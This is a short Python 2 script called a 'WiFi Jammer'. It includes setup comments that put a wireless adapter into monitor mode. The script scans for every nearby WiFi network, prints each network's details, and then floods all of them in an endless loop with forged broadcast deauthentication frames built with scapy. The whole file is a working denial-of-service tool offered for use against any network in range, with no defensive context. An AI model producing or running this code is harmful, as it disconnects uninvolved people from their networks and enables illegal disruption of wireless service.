#!/usr/bin/env python
# Python WiFi Jammer
# First need to install the following modules using pip
# pip install wifi wireless scapy
# C:/Python27/Scripts/pip.exe install wifi wireless scapy
# Need to change Wifi Adapter to monitor mode
# iwconfig wlan1 down
# iwconfig wlan1 mode monitor
# iwconfig wlan1 up
# lots more WiFi Scappy Python scripts can be found here: https://www.programcreek.com/python/example/92705/scapy.layers.dot11.Dot11

import wireless
from wifi import Cell
from scapy.all import *

wifi1 = wireless.Wireless()
interface = wifi1.interface()
#print interface

all_wifi_networks = Cell.all(interface)
print all_wifi_networks
bssids = []

for wifi in all_wifi_networks:
    print "Network Name : " + wifi.ssid
    print "Network Address : " + wifi.address
    print "Network Channel : " + str(wifi.channel)
    print "Network Quality : " + str(wifi.quality)
    bssids.append(wifi.address)


def jam(address):
    conf.iface = "wlan1"
    bssid = address
    client = "FF:FF:FF:FF:FF:FF"
    count = 3
    conf.verb = 0
    packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
    for n in range(int(count)):
        sendp(packet)
        print 'Deauth num ' + str(n) + ' sent via: ' + conf.iface + ' to BSSID: ' + bssid


while True:
    for bssid in bssids:
        print "Jamming on : {0}".format(bssid)
        jam(bssid)